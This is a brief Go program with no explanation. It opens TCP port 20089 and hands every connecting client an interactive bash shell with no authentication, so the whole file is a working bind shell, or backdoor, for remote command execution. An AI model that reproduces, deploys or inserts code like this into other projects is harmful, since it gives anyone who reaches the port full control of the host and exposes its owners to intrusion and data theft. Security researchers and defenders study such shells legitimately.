package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func main() {
	listener, err := net.Listen("tcp", ":20089")
	if err != nil {
		log.Fatalln(err)
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}

func handle(conn net.Conn) {
	cmd := exec.Command("/bin/bash", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)

	cmd.Run()
	conn.Close()
}
